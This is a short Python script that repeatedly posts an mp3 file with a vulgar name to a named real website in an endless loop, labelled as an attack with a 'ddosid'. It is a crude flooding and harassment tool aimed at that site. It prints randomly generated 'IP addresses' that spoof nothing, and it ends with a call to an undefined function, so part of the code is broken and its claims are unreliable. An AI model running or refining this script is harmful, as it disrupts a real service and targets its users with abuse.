import requests
from random import randint
ddosid = (randint(1111111111111111,9999999999999999))
print ("Loading file...")
while True:
    try:
      files = {'file': open('fuckplayforwomen.mp3', 'rb')}
      response = requests.post("http://www.ovarit.com/", files=files)
      print(f"Sent file to Ovarit at {response.elapsed.total_seconds()} seconds. Attack complete. Sent as:")
      ip = str(randint(0, 255)) + '.' + str(randint(0, 255)) + '.' + str(randint(0, 255)) + '.' + str(randint(0, 255))
      print(ip)
      print (ddosid)
    except requests.exceptions.RequestException as e:
      print(f"An error occurred: {e}")

      

if __name__ == "__main__":
  kill_farts()
